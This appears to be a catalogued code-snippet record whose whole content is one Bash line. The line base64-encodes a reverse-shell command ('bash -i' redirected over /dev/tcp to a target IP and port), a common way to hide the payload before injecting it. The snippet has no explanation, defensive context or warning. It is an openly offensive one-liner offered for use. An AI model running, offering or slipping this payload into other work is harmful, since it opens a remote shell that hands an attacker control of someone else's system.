---
id: 9fa9d73b-3f65-43db-9786-cf325574389b
type: code
language: Bash
verified: false
created_at: '2019-11-04T21:40:40.399950+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 9fa9d73b

**Language**: Bash

```bash
echo 'bash -i >& /dev/tcp/$_TARGET_IP/$_TARGET_PORT 0>&1' | base64 -w 0
```
